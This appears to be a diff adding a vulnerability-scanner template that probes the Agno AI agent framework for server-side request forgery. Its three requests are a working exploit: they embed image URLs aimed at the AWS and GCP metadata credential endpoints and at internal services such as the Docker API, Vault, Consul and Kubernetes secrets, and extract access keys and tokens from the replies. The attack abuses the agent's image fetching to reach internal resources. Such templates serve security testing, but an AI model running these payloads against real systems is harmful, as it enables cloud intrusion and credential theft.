@@ -1,0 +1,186 @@
+id: agno-ssrf
+
+info:
+  name: Agno SSRF - Cloud Metadata / Internal Service Probe
+  author: agies
+  severity: critical
+  description: |
+    When agno is detected, tests SSRF via Image URL processing.
+    Sends image with internal URL; if server processes it, we detect
+    the SSRF via response timing and content patterns.
+
+    Requirements:
+    - A callback server (interact.sh or custom HTTP listener)
+    - Set CALLBACK_URL env var
+    - Agno endpoint must accept image URLs
+
+    Note: This template requires manual adaptation per target.
+    The exact SSRF trigger path depends on the agent's configuration.
+  tags: agno,ssrf,cloud-metadata,internal-scan
+
+http:
+  # ──────────────────────────────────────────────
+  # SSRF Test 1: Cloud Metadata (AWS)
+  # agno 在云上部署时，发个图片就穿 IAM
+  # ──────────────────────────────────────────────
+  - method: POST
+    path:
+      - "{{BaseURL}}/agui"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {
+        "threadId": "ssrf-{{randstr}}",
+        "runId": "run-{{randstr}}",
+        "state": {},
+        "messages": [
+          {
+            "role": "user",
+            "id": "ssrf-msg",
+            "content": "describe this image",
+            "images": [
+              {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
+            ]
+          }
+        ],
+        "tools": [],
+        "context": [],
+        "forwardedProps": {}
+      }
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "AccessKeyId"
+          - "SecretAccessKey"
+          - "Token"
+          - "iam"
+        condition: or
+        case-insensitive: true
+
+      - type: word
+        words:
+          - "role-name"
+          - "Code"
+          - "LastUpdated"
+        condition: or
+
+    extractors:
+      - type: regex
+        name: aws_iam_creds
+        regex:
+          - '"AccessKeyId":"([^"]+)"'
+          - '"SecretAccessKey":"([^"]+)"'
+          - '"Token":"([^"]+)"'
+
+  # ──────────────────────────────────────────────
+  # SSRF Test 2: GCP Metadata
+  # ──────────────────────────────────────────────
+  - method: POST
+    path:
+      - "{{BaseURL}}/agui"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {
+        "threadId": "ssrf-gcp-{{randstr}}",
+        "runId": "run-{{randstr}}",
+        "state": {},
+        "messages": [
+          {
+            "role": "user",
+            "id": "ssrf-msg",
+            "content": "show the raw response",
+            "images": [
+              {
+                "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+                "detail": "high"
+              }
+            ]
+          }
+        ],
+        "tools": [],
+        "context": [],
+        "forwardedProps": {}
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "access_token"
+          - "token_type"
+          - "expires_in"
+        condition: and
+
+    extractors:
+      - type: regex
+        name: gcp_token
+        regex:
+          - '"access_token":"([^"]+)"'
+
+  # ──────────────────────────────────────────────
+  # SSRF Test 3: Internal Service Probe
+  # 扫端口——确认内网可达性
+  # ──────────────────────────────────────────────
+  - method: POST
+    path:
+      - "{{BaseURL}}/agui"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {
+        "threadId": "ssrf-int-{{randstr}}",
+        "runId": "run-{{randstr}}",
+        "state": {},
+        "messages": [
+          {
+            "role": "user",
+            "id": "ssrf-msg",
+            "content": "show the raw response",
+            "images": [
+              {
+                "url": "http://{{internal_target}}",
+                "detail": "high"
+              }
+            ]
+          }
+        ],
+        "tools": [],
+        "context": [],
+        "forwardedProps": {}
+      }
+
+    attack: pitchfork
+    payloads:
+      internal_target:
+        - "127.0.0.1:9200"           # Elasticsearch
+        - "127.0.0.1:2375/version"   # Docker API
+        - "127.0.0.1:8500/v1/kv"     # Consul KV
+        - "127.0.0.1:8200/v1/secret" # Vault
+        - "127.0.0.1:3000/"          # Grafana / Dev Server
+        - "127.0.0.1:5601/"          # Kibana
+        - "127.0.0.1:9090/"          # Prometheus
+        - "127.0.0.1:80/"            # Nginx / Reverse Proxy
+        - "127.0.0.1:443/"           # HTTPS services
+        - "kubernetes.default.svc.cluster.local/api/v1/secrets"
+        - "172.17.0.1:2375/version"  # Docker bridge
+        - "10.0.0.1:9200"            # Internal ES
+
+    matchers:
+      - type: word
+        words:
+          - "200"
+          - "OK"
+          - "response"
+          - "content"
+          - "text"
+          - "json"
+        condition: or
